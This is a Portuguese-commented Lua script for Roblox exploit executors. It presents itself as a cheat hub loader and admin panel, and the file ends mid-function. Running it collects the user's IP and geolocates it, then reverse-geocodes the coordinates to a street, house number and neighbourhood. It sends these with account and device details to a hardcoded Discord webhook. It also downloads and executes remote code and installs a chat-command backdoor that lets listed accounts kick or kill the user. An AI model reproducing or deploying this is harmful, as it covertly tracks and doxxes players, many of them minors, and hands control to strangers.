--[[
=====================================================================
  [ DELTA MOBILE ] WEBHOOK LOGGER - v6 (LOCALIZAÇÃO POR CONSENSO)
  Conta + dispositivo + servidor + localização detalhada
=====================================================================
]]

local CONFIG = {
	Webhook      = "https://discord.com/api/webhooks/1560066552718430311/9kgVR0TlYesNfPyj22tUV7rWFTrHAIABx05bo5eUv-Q8BN4wD9dGZJHctACd4fOh8jhr",
	Nome         = "Delta Logger",
	Avatar       = "https://cdn-icons-png.flaticon.com/512/5968/5968890.png",
	Cor          = 0x5865F2,
	Cor2         = 0x2ECC71,
	MarcarTodos  = false,
	EnviarAvatar = true,
	Debug        = false, -- true se quiser ver logs no console
	UsarWait     = true,
	UserAgent    = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
}

local HttpService        = game:GetService("HttpService")
local Players            = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService   = game:GetService("UserInputService")
local Stats              = game:GetService("Stats")

local function log(...) if CONFIG.Debug then print("[Logger]", ...) end end

-- ============================================================
--  HTTP
-- ============================================================
local function cabecalhos()
	return {
		["User-Agent"]      = CONFIG.UserAgent,
		["Accept"]          = "application/json",
		["Accept-Language"] = "pt-BR,pt;q=0.9,en;q=0.8",
		["Content-Type"]    = "application/json",
	}
end

local function httpRequest(opts)
	local metodos = {
		function() return request(opts) end,
		function() return http_request(opts) end,
		function() return syn.request(opts) end,
		function() return http.request(opts) end,
	}
	for _, fn in ipairs(metodos) do
		local ok, res = pcall(fn)
		if ok and type(res) == "table" and (res.StatusCode or res.Status) then return res end
	end
	local ok, res = pcall(function()
		return HttpService:RequestAsync({ Url = opts.Url, Method = opts.Method, Headers = opts.Headers, Body = opts.Body })
	end)
	if ok and res then return res end
	return nil
end

local function getRaw(url)
	local res = httpRequest({ Url = url, Method = "GET", Headers = cabecalhos() })
	if res and res.Body then return res.Body end
	local ok, body = pcall(game.HttpGet, game, url)
	if ok then return body end
	return nil
end

local function apiGet(url)
	local corpo = getRaw(url)
	if not corpo then return nil end
	local ok, dados = pcall(HttpService.JSONDecode, HttpService, corpo)
	if ok then return dados end
	return nil
end

local function postar(url, corpo)
	if CONFIG.UsarWait and not url:find("?") then url = url .. "?wait=true" end
	local res = httpRequest({ Url = url, Method = "POST", Headers = cabecalhos(), Body = corpo })
	if not res then return false, "sem resposta" end
	local code = tonumber(res.StatusCode or res.Status or 0)
	if code >= 200 and code < 300 then return true end
	return false, ("status %s"):format(code)
end

-- ============================================================
--  LOCALIZAÇÃO (NOVO: consenso entre 3 fontes)
-- ============================================================
local function obterLocalizacao()
	local fontes = {
		{ url = "https://ipwho.is/", parse = function(d)
			if d.success == false then return nil end
			return { IP = d.ip, Pais = d.country, Estado = d.region, Cidade = d.city, CEP = d.postal,
				Provedor = d.connection and (d.connection.isp or d.connection.org),
				ASN = d.connection and d.connection.asn, Tipo = d.type,
				Fuso = d.timezone and d.timezone.id, UTC = d.timezone and d.timezone.utc,
				Lat = d.latitude, Lon = d.longitude }
		end },
		{ url = "http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,query", parse = function(d)
			if d.status ~= "success" then return nil end
			return { IP = d.query, Pais = d.country, Estado = d.regionName, Cidade = d.city, CEP = d.zip,
				Provedor = d.isp, ASN = d.as, Tipo = d.mobile and "Mobile" or "Fixo",
				Fuso = d.timezone, Lat = d.lat, Lon = d.lon }
		end },
		{ url = "https://ipapi.co/json/", parse = function(d)
			if not d.latitude then return nil end
			return { IP = d.ip, Pais = d.country_name, Estado = d.region, Cidade = d.city, CEP = d.postal,
				Provedor = d.org, ASN = d.asn, Tipo = "IPv4", Fuso = d.timezone,
				Lat = d.latitude, Lon = d.longitude }
		end },
	}

	-- Coleta de todas as fontes disponíveis
	local lista = {}
	for _, f in ipairs(fontes) do
		local d = apiGet(f.url)
		if d then
			local ok, res = pcall(f.parse, d)
			if ok and res and res.Lat and res.Lon then table.insert(lista, res) end
		end
		task.wait(0.3)
	end
	if #lista == 0 then return nil end

	-- Voto de maioria por cidade (descarta outliers)
	local votos = {}
	for _, item in ipairs(lista) do
		local k = tostring(item.Cidade):lower()
		votos[k] = (votos[k] or 0) + 1
	end
	local vencedora, maxVotos = nil, 0
	for k, n in pairs(votos) do
		if n > maxVotos then vencedora, maxVotos = k, n end
	end

	-- Mantém só as fontes que concordam com a cidade vencedora
	local iguais = {}
	for _, item in ipairs(lista) do
		if tostring(item.Cidade):lower() == vencedora then table.insert(iguais, item) end
	end
	local base = iguais[1] or lista[1]

	-- Média das coordenadas concordantes (reduz erro)
	local somaLa, somaLo = 0, 0
	for _, item in ipairs(iguais) do
		somaLa = somaLa + item.Lat
		somaLo = somaLo + item.Lon
	end
	local n = math.max(#iguais, 1)
	base.Lat = somaLa / n
	base.Lon = somaLo / n
	base.Consenso = ("%d/%d"):format(#iguais, #lista)
	base.Coords = ("%s, %s"):format(tostring(base.Lat), tostring(base.Lon))
	return base
end

-- Endereço detalhado (rua + número + bairro)
local function obterEndereco(lat, lon)
	if not lat or not lon then return {} end
	local endereco = {}

	-- Nominatim (fonte principal de rua)
	local n = apiGet(("https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=%s&lon=%s&zoom=18&addressdetails=1&accept-language=pt-BR"):format(lat, lon))
	if n and n.address then
		local a = n.address
		endereco.Rua    = a.road or a.pedestrian or a.footway or a.path
		endereco.Numero = a.house_number
		endereco.Bairro = a.suburb or a.neighbourhood or a.city_district or a.quarter or a.village
	end

	-- Photon (fallback de rua)
	if not endereco.Rua then
		task.wait(0.4)
		local p = apiGet(("https://photon.komoot.io/reverse?lat=%s&lon=%s&lang=pt"):format(lat, lon))
		if p and p.features and p.features[1] and p.features[1].properties then
			local props = p.features[1].properties
			endereco.Rua    = props.street or props.name
			endereco.Numero = endereco.Numero or props.housenumber
			endereco.Bairro = endereco.Bairro or props.district or props.locality
		end
	end

	-- BigDataCloud (fallback de bairro)
	if not endereco.Bairro then
		task.wait(0.4)
		local d = apiGet(("https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=%s&longitude=%s&localityLanguage=pt"):format(lat, lon))
		if d then
			if d.locality and d.locality ~= "" then
				endereco.Bairro = d.locality
			end
			if not endereco.Bairro and d.localityInfo and d.localityInfo.informative then
				for _, item in ipairs(d.localityInfo.informative) do
					if item.name and item.name ~= "" then
						endereco.Bairro = item.name
						break
					end
				end
			end
		end
	end

	-- Descarta ruas genéricas sem nome
	if endereco.Rua then
		local r = endereco.Rua:lower()
		if r:find("unnamed") or r:find("sem nome") then endereco.Rua = nil end
	end

	return endereco
end

-- ============================================================
--  CONTA / PERFIL
-- ============================================================
local function formatarData(iso)
	local a, m, d = tostring(iso):match("(%d+)-(%d+)-(%d+)")
	if a then return ("%s/%s/%s"):format(d, m, a) end
	return iso
end

local function obterPerfil(userId)
	local perfil = {}
	local d = apiGet(("https://users.roblox.com/v1/users/%d"):format(userId))
	if d and d.created then perfil.Criada = formatarData(d.created) end

	task.wait(0.3)
	local s = apiGet(("https://friends.roblox.com/v1/users/%d/followers/count"):format(userId))
	if s and s.count then perfil.Seguidores = s.count end

	task.wait(0.3)
	local a = apiGet(("https://friends.roblox.com/v1/users/%d/friends/count"):format(userId))
	if a and a.count then perfil.Amigos = a.count end

	return perfil
end

local function obterAvatar(userId)
	if not CONFIG.EnviarAvatar then return nil end
	local d = apiGet(("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false"):format(userId))
	if d and d.data and d.data[1] then return d.data[1].imageUrl end
	return nil
end

local function obterNomeJogo()
	local ok, info = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
	if ok and info then return info.Name end
	return "Desconhecido"
end

-- ============================================================
--  HELPERS DE EMBED
-- ============================================================
local function add(campos, nome, valor, inline)
	if valor ~= nil and valor ~= "" then
		table.insert(campos, { name = nome, value = tostring(valor):sub(1, 1024), inline = inline ~= false })
	end
end

-- ============================================================
--  ENVIO
-- ============================================================
local function enviar()
	task.wait(1)
	repeat task.wait() until Players.LocalPlayer or #Players:GetPlayers() > 0
	local lp = Players.LocalPlayer

	local executor, versao = "Desconhecido", "?"
	if identifyexecutor then
		local ok, nome, ver = pcall(identifyexecutor)
		if ok and nome then executor, versao = nome, ver or "?" end
	end

	local loc      = obterLocalizacao()
	local endereco = loc and obterEndereco(loc.Lat, loc.Lon) or {}
	local perfil   = lp and obterPerfil(lp.UserId) or {}

	local embeds = {}

	-- Embed 1: Conta
	local c1 = {}
	if lp then
		add(c1, "👤 Usuário", lp.Name)
		add(c1, "🏷️ Display", lp.DisplayName)
		add(c1, "🆔 UserId", lp.UserId)
		add(c1, "📅 Conta criada", perfil.Criada)
		add(c1, "⏳ Idade", lp.AccountAge .. " dias")
		add(c1, "💎 Premium", tostring(lp.MembershipType):gsub("Enum.MembershipType%.", ""))
		add(c1, "👥 Seguidores", perfil.Seguidores)
		add(c1, "🤝 Amigos", perfil.Amigos)
	end
	local e1 = { title = "👤 Conta Roblox", color = CONFIG.Cor, fields = c1 }
	if lp then
		local avatar = obterAvatar(lp.UserId)
		if avatar then e1.thumbnail = { url = avatar } end
	end
	table.insert(embeds, e1)

	-- Embed 2: Dispositivo / Executor
	local c2 = {}
	add(c2, "⚙️ Executor", ("%s v%s"):format(executor, tostring(versao)))
	add(c2, "🎚️ Versão Roblox", (version and version()) or "?")
	add(c2, "📱 Plataforma", UserInputService.TouchEnabled and "Mobile" or "PC")
	if workspace.CurrentCamera then
		add(c2, "🖥️ Resolução", ("%dx%d"):format(workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y))
	end
	local okFps, fps = pcall(function() return workspace:GetRealPhysicsFPS() end)
	add(c2, "🎞️ FPS", okFps and math.floor(fps) or nil)
	local okPing, ping = pcall(function() return lp:GetNetworkPing() end)
	add(c2, "📶 Ping", okPing and (math.floor(ping * 1000) .. " ms") or nil)
	local okMem, mem = pcall(function() return Stats:GetTotalMemoryUsageMb() end)
	add(c2, "🧠 Memória", okMem and (math.floor(mem) .. " MB") or nil)
	add(c2, "👨‍👩‍👦 Jogadores", #Players:GetPlayers())
	table.insert(embeds, { title = "📱 Dispositivo & Executor", color = CONFIG.Cor2, fields = c2 })

	-- Embed 3: Rede / Localização
	local c3 = {}
	if loc then
		local aprox = loc.Consenso:match("^1/")
		add(c3, "🌐 IP", loc.IP)
		add(c3, "📡 Tipo", loc.Tipo)
		add(c3, "🏳️ País", loc.Pais)
		add(c3, "🗺️ Estado", loc.Estado)
		add(c3, "🏙️ Cidade", loc.Cidade)
		add(c3, "🛣️ Rua", endereco.Rua and (endereco.Rua .. (aprox and " (aprox.)" or "")) or "—")
		add(c3, "🔢 Número", endereco.Numero or "—")
		add(c3, "🏘️ Bairro", endereco.Bairro or "—")
		add(c3, "📮 CEP", loc.CEP)
		add(c3, "🏢 Provedor", loc.Provedor, false)
		add(c3, "🔢 ASN", loc.ASN)
		add(c3, "🕓 Fuso", loc.Fuso)
		add(c3, "⌚ UTC", loc.UTC)
		add(c3, "🎯 Consenso", loc.Consenso .. " fontes")
		add(c3, "🧭 Coordenadas", loc.Coords, false)
	end
	table.insert(embeds, { title = "🌐 Rede & Localização", color = 0xE67E22, fields = c3 })

	-- Embed 4: Servidor
	local c4 = {}
	add(c4, "🎮 Jogo", obterNomeJogo())
	add(c4, "📍 PlaceId", game.PlaceId)
	add(c4, "🔗 JobId", game.JobId, false)
	table.insert(embeds, { title = "🎮 Servidor", color = 0x9B59B6, fields = c4 })

	local payload = {
		username = CONFIG.Nome,
		avatar_url = CONFIG.Avatar,
		content = CONFIG.MarcarTodos and "@everyone" or "",
		embeds = embeds,
	}

	local ok, err = pcall(function()
		local enviado, erro = postar(CONFIG.Webhook, HttpService:JSONEncode(payload))
		if not enviado then error(erro) end
	end)

	if ok then print("[Logger] ✅ Enviado!") else warn("[Logger] ❌ " .. tostring(err)) end
end

enviar()

-- =============================================================================
--  CARREGAR O HUB PRINCIPAL (EXECUTADO PARA TODOS)
-- =============================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/trakishub/Vortex-hub-v5/refs/heads/main/Brookhaven%20rp"))()
end)

-- =============================================================================
-- VORTEX HUB | ADMIN PANEL
-- =============================================================================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = workspace
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Debris = game:GetService("Debris")

--==================== LISTAS DE AUTORIZADOS (PAINEL ADM) ====================
local Donos = { ["Hey_zPUDIM"] = true, ["ax7_LZINN6"] = true }
local Testers = { ["Marcosjjunioioe123"] = true }
local Divulgadores = { ["hoangvanhieuCc_39"] = true, ["Tokitooff29"] = true, ["biadofrostzin_7"] = true }
local Autorizados = {}

local function EstaAutorizado(nome)
    if Donos[nome] or Testers[nome] or Divulgadores[nome] or Autorizados[nome] then
        return true
    end
    return false
end

local playerOriginalSpeed = {}
local jaulasCriadas = {}
local SilentMode = false

local function MostrarBannerAviso(autorNome, textoAviso)
    local screenGui = LocalPlayer:FindFirstChildOfClass("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild("FxAvisoGui")
    if screenGui then screenGui:Destroy() end

    local newGui = Instance.new("ScreenGui")
    newGui.Name = "FxAvisoGui"
    newGui.IgnoreGuiInset = true
    newGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local banner = Instance.new("Frame")
    banner.Size = UDim2.new(0, 420, 0, 75)
    banner.Position = UDim2.new(0.5, -210, 0, -90)
    banner.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    banner.BorderSizePixel = 0
    banner.Parent = newGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = banner

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(170, 45, 255)
    stroke.Thickness = 2
    stroke.Parent = banner

    local avatarImg = Instance.new("ImageLabel")
    avatarImg.Size = UDim2.new(0, 55, 0, 55)
    avatarImg.Position = UDim2.new(0, 10, 0.5, -27.5)
    avatarImg.BackgroundTransparency = 1
    avatarImg.Parent = banner

    local avCorner = Instance.new("UICorner")
    avCorner.CornerRadius = UDim.new(0, 99)
    avCorner.Parent = avatarImg

    pcall(function()
        local targetPlr = Players:FindFirstChild(autorNome)
        if targetPlr then
            local thumb = Players:GetUserThumbnailAsync(targetPlr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
            avatarImg.Image = thumb
        end
    end)

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -75, 0, 22)
    titleLabel.Position = UDim2.new(0, 75, 0, 8)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "🚨 AVISO DE: " .. string.upper(autorNome)
    titleLabel.TextColor3 = Color3.fromRGB(215, 110, 255)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 13
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = banner

    local msgLabel = Instance.new("TextLabel")
    msgLabel.Size = UDim2.new(1, -75, 0, 35)
    msgLabel.Position = UDim2.new(0, 75, 0, 30)
    msgLabel.BackgroundTransparency = 1
    msgLabel.Text = textoAviso
    msgLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    msgLabel.Font = Enum.Font.GothamMedium
    msgLabel.TextSize = 12
    msgLabel.TextWrapped = true
    msgLabel.TextXAlignment = Enum.TextXAlignment.Left
    msgLabel.Parent = banner

    TweenService:Create(banner, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -210, 0, 15)
    }):Play()

    task.delay(6, function()
        if banner and banner.Parent then
            local sai = TweenService:Create(banner, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                Position = UDim2.new(0.5, -210, 0, -90)
            })
            sai:Play()
            sai.Completed:Wait()
            newGui:Destroy()
        end
    end)
end

-- ==================== TAG ====================
local function CriarTag(player, tagTexto, corRGB)
    if not player.Character or not player.Character:FindFirstChild("Head") then return end
    local head = player.Character.Head

    local tagAntiga = head:FindFirstChild("CustomTag")
    if tagAntiga then tagAntiga:Destroy() end

    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = "CustomTag"
    billboardGui.Adornee = head
    billboardGui.Size = UDim2.new(0, 145, 0, 34)
    billboardGui.AlwaysOnTop = true
    billboardGui.StudsOffset = Vector3.new(0, 2.6, 0)
    billboardGui.MaxDistance = 130
    billboardGui.Parent = head

    local background = Instance.new("ImageLabel")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Image = ""
    background.ImageColor3 = Color3.fromRGB(255, 255, 255)
    background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    background.BackgroundTransparency = 0.45
    background.BorderSizePixel = 0
    background.ScaleType = Enum.ScaleType.Crop
    background.Parent = billboardGui

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0.5, 0)
    uiCorner.Parent = background

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Thickness = 2.2
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = background

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = string.upper(tagTexto)
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextSize = 14
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextStrokeTransparency = 0.25
    textLabel.TextStrokeColor3 = Color3.fromRGB(30, 20, 40)
    textLabel.Parent = background

    local textGradient = Instance.new("UIGradient")
    textGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,   Color3.fromRGB(255, 80, 80)),
        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 180, 50)),
        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(80, 255, 120)),
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(80, 180, 255)),
        ColorSequenceKeypoint.new(0.8, Color3.fromRGB(180, 80, 255)),
        ColorSequenceKeypoint.new(1,   Color3.fromRGB(255, 80, 80))
    })
    textGradient.Parent = textLabel

    task.spawn(function()
        while billboardGui and billboardGui.Parent do
            for i = 0, 1, 0.015 do
                if not textGradient or not textGradient.Parent then break end
                textGradient.Offset = Vector2.new(i, 0)
                task.wait(0.02)
            end
        end
    end)
end

local function RemoverTag(player)
    if player.Character and player.Character:FindFirstChild("Head") then
        local tag = player.Character.Head:FindFirstChild("CustomTag")
        if tag then tag:Destroy() end
    end
end

local function PrenderEmJaula()
    if jaulasCriadas[LocalPlayer.Name] then return end

    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end

    local pos = root.Position
    local model = Instance.new("Model")
    model.Name = "FxJail_" .. LocalPlayer.Name

    local function CriarGrade(cf, size)
        local p = Instance.new("Part")
        p.Size = size
        p.CFrame = cf
        p.Anchored = true
        p.Material = Enum.Material.Metal
        p.BrickColor = BrickColor.new("Really black")
        p.Transparency = 0.3
        p.Parent = model
    end

    CriarGrade(CFrame.new(pos + Vector3.new(0, -3.5, 0)), Vector3.new(8, 1, 8))
    CriarGrade(CFrame.new(pos + Vector3.new(0, 4.5, 0)), Vector3.new(8, 1, 8))
    CriarGrade(CFrame.new(pos + Vector3.new(4, 0.5, 0)), Vector3.new(1, 7, 8))
    CriarGrade(CFrame.new(pos + Vector3.new(-4, 0.5, 0)), Vector3.new(1, 7, 8))
    CriarGrade(CFrame.new(pos + Vector3.new(0, 0.5, 4)), Vector3.new(8, 7, 1))
    CriarGrade(CFrame.new(pos + Vector3.new(0, 0.5, -4)), Vector3.new(8, 7, 1))

    model.Parent = Workspace
    jaulasCriadas[LocalPlayer.Name] = model
end

local function SoltarDaJaula()
    if jaulasCriadas[LocalPlayer.Name] then
        jaulasCriadas[LocalPlayer.Name]:Destroy()
        jaulasCriadas[LocalPlayer.Name] = nil
    end
end

-- ==================== MONSTRO ====================
local function InvocarMonstro()
    local character = LocalPlayer.Character
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local root = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not root then return end

    local old = Workspace:FindFirstChild("FxMonster_" .. LocalPlayer.Name)
    if old then old:Destroy() end

    local monster = Instance.new("Model")
    monster.Name = "FxMonster_" .. LocalPlayer.Name

    local body = Instance.new("Part")
    body.Name = "HumanoidRootPart"
    body.Size = Vector3.new(3.2, 4.5, 2.2)
    body.Color = Color3.fromRGB(20, 0, 0)
    body.Material = Enum.Material.Neon
    body.Anchored = false
    body.CanCollide = false
    body.Parent = monster

    local head = Instance.new("Part")
    head.Size = Vector3.new(2.6, 2.6, 2.6)
    head.Color = Color3.fromRGB(40, 0, 0)
    head.Material = Enum.Material.Neon
    head.CanCollide = false
    head.Parent = monster

    local weld = Instance.new("Weld")
    weld.Part0 = body
    weld.Part1 = head
    weld.C0 = CFrame.new(0, 3.4, 0)
    weld.Parent = body

    local function criarOlho(x)
        local eye = Instance.new("Part")
        eye.Size = Vector3.new(0.55, 0.55, 0.3)
        eye.Color = Color3.fromRGB(255, 20, 20)
        eye.Material = Enum.Material.Neon
        eye.CanCollide = false
        eye.Parent = monster
        local w = Instance.new("Weld")
        w.Part0 = head
        w.Part1 = eye
        w.C0 = CFrame.new(x, 0.35, -1.35)
        w.Parent = head
    end
    criarOlho(-0.55)
    criarOlho(0.55)

    monster.PrimaryPart = body
    monster.Parent = Workspace

    body.CFrame = root.CFrame * CFrame.new(0, 1, 16)

    local att = Instance.new("Attachment", body)
    local particles = Instance.new("ParticleEmitter")
    particles.Texture = "rbxassetid://243660364"
    particles.Color = ColorSequence.new(Color3.fromRGB(160, 0, 0))
    particles.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 0)})
    particles.Lifetime = NumberRange.new(1.3, 2.2)
    particles.Rate = 70
    particles.Speed = NumberRange.new(4, 9)
    particles.Parent = att

    local music = Instance.new("Sound")
    music.SoundId = "rbxassetid://1837879081"
    music.Volume = 4.5
    music.Looped = true
    music.Parent = body
    music:Play()

    local roar = Instance.new("Sound")
    roar.SoundId = "rbxassetid://138085780"
    roar.Volume = 3.5
    roar.Parent = body
    roar:Play()

    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
    bv.P = 3000
    bv.Velocity = Vector3.zero
    bv.Parent = body

    local conn
    conn = RunService.Heartbeat:Connect(function()
        if not character or not character.Parent or not humanoid or humanoid.Health <= 0 then
            conn:Disconnect()
            if monster then monster:Destroy() end
            return
        end
        if not body or not body.Parent then
            conn:Disconnect()
            return
        end

        local direction = (root.Position - body.Position)
        local distance = direction.Magnitude

        if distance > 1 then
            local moveDir = direction.Unit
            bv.Velocity = moveDir * 19
            body.CFrame = CFrame.lookAt(body.Position, Vector3.new(root.Position.X, body.Position.Y, root.Position.Z))
        else
            bv.Velocity = Vector3.zero
        end

        if distance <= 8 then
            humanoid:TakeDamage(22)

            local hit = Instance.new("Sound")
            hit.SoundId = "rbxassetid://9114224572"
            hit.Volume = 2.2
            hit.Parent = root
            hit:Play()
            Debris:AddItem(hit, 2)
        end
    end)

    task.delay(45, function()
        if conn then conn:Disconnect() end
        if monster then monster:Destroy() end
    end)
end

-- ==================== ITEM DE PEGAR JOGADORES (CORRIGIDO) ====================
local function DarItemPegar()
    local character = LocalPlayer.Character
    if not character then return end
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return end

    local antigo = backpack:FindFirstChild("FxGrab") or character:FindFirstChild("FxGrab")
    if antigo then antigo:Destroy() end

    local tool = Instance.new("Tool")
    tool.Name = "FxGrab"
    tool.RequiresHandle = true
    tool.CanBeDropped = false

    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(0.8, 0.8, 2.5)
    handle.Color = Color3.fromRGB(170, 50, 255)
    handle.Material = Enum.Material.Neon
    handle.Parent = tool

    tool.Parent = backpack

    local holding = nil
    local conn = nil

    tool.Activated:Connect(function()
        -- Se já estiver segurando, solta
        if holding then
            if conn then conn:Disconnect() end
            holding = nil
            conn = nil
            return
        end

        local mouse = LocalPlayer:GetMouse()
        local target = mouse.Target
        if not target then return end

        local model = target:FindFirstAncestorOfClass("Model")
        if not model then return end

        local player = Players:GetPlayerFromCharacter(model)
        if not player or player == LocalPlayer then return end

        local root = model:FindFirstChild("HumanoidRootPart")
        local myRoot = character:FindFirstChild("HumanoidRootPart")
        if not root or not myRoot then return end

        holding = root

        -- Segura a pessoa na frente (método que funciona)
        conn = RunService.Heartbeat:Connect(function()
            if not holding or not holding.Parent or not myRoot or not myRoot.Parent then
                if conn then conn:Disconnect() end
                holding = nil
                return
            end
            holding.CFrame = myRoot.CFrame * CFrame.new(0, 0, -5)
        end)
    end)

    tool.Unequipped:Connect(function()
        if conn then conn:Disconnect() end
        holding = nil
        conn = nil
    end)

    local hum = character:FindFirstChildOfClass("Humanoid")
    if hum then
        hum:EquipTool(tool)
    end
end

local function EnviarComando(comando, alvo, argumentoExtra)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if canal then
        local textoCompleto = ";" .. comando .. " " .. (alvo or "")
        if argumentoExtra and argumentoExtra ~= "" then
            textoCompleto = textoCompleto .. " " .. argumentoExtra
        end
        canal:SendAsync(textoCompleto)
    end
end

local function ProcessarMensagem(msgText, authorName)
    if not msgText or not authorName then return end

    local targetLower = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local autorPlayer = Players:FindFirstChild(authorName)
    local msgLower = msgText:lower()

    if msgLower:match("^;aviso%s+") then
        local textoAviso = msgText:sub(8)
        if textoAviso and textoAviso ~= "" then
            MostrarBannerAviso(authorName, textoAviso)
        end
        return
    end

    if msgLower:match("^;bring%s+" .. targetLower) then
        if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") and root then
            root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(2, 1, 0)
        end
    end

    if msgLower:match("^;tp%s+" .. targetLower) then
        if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") and root then
            root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(2, 1, 0)
        end
    end

    if msgLower:match("^;jail%s+" .. targetLower) then
        PrenderEmJaula()
    end

    if msgLower:match("^;unjail%s+" .. targetLower) then
        SoltarDaJaula()
    end

    if msgLower:match("^;kick%s+" .. targetLower) then
        local partes = {}
        for palavra in msgText:gmatch("%S+") do table.insert(partes, palavra) end
        local motivo = table.concat(partes, " ", 3)
        LocalPlayer:Kick((motivo ~= "") and motivo or "You got kicked by Fx client Hub")
    end

    if msgLower:match("^;ban%s+" .. targetLower) then
        local partes = {}
        for palavra in msgText:gmatch("%S+") do table.insert(partes, palavra) end
        local motivo = table.concat(partes, " ", 3)
        LocalPlayer:Kick((motivo ~= "") and motivo or "You got banned by Fx Hub")
    end

    if msgLower:match("^;kill%s+" .. targetLower) then
        if character then character:BreakJoints() end
    end

    if msgLower:match("^;killplus%s+" .. targetLower) then
        if character then
            character:BreakJoints()
            if root then
                for i = 1, 10 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10, 10, 10)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Material = Enum.Material.Neon
                    part.BrickColor = BrickColor.Random()
                    part.CFrame = root.CFrame
                    part.Parent = Workspace
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-50, 50), math.random(20, 80), math.random(-50, 50))
                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                    bv.Parent = part
                    Debris:AddItem(part, 3)
                end
            end
        end
    end

    if msgLower:match("^;backrooms%s+" .. targetLower) then
        local player = LocalPlayer
        local mapID = 10581711055
        local distantPosition = Vector3.new(4000, 7, 0)
        local teleportPosition = Vector3.new(4029, 9, 24)

        pcall(function()
            local mapa = game:GetObjects("rbxassetid://" .. mapID)[1]
            mapa.Parent = Workspace
            if not mapa.PrimaryPart then
                local part = mapa:FindFirstChildWhichIsA("BasePart")
                if part then mapa.PrimaryPart = part end
            end
            mapa:SetPrimaryPartCFrame(CFrame.new(distantPosition))
            if player.Character then
                player.Character:MoveTo(teleportPosition)
            end
        end)
    end

    if msgLower:match("^;fling%s+" .. targetLower) then
        if root then
            local tween = TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(0, 100000, 0)})
            tween:Play()
        end
    end

    if msgLower:match("^;freeze%s+" .. targetLower) then
        if humanoid then
            playerOriginalSpeed[targetLower] = humanoid.WalkSpeed
            humanoid.WalkSpeed = 0
        end
    end

    if msgLower:match("^;unfreeze%s+" .. targetLower) then
        if humanoid then
            humanoid.WalkSpeed = playerOriginalSpeed[targetLower] or 16
        end
    end

    if msgLower:match("^;monster%s+" .. targetLower) then
        InvocarMonstro()
    end

    if msgLower:match("^;explode%s+" .. targetLower) then
        if root then
            local explosion = Instance.new("Explosion")
            explosion.Position = root.Position
            explosion.BlastRadius = 20
            explosion.BlastPressure = 500000
            explosion.Parent = Workspace
            if humanoid then humanoid.Health = 0 end
        end
    end

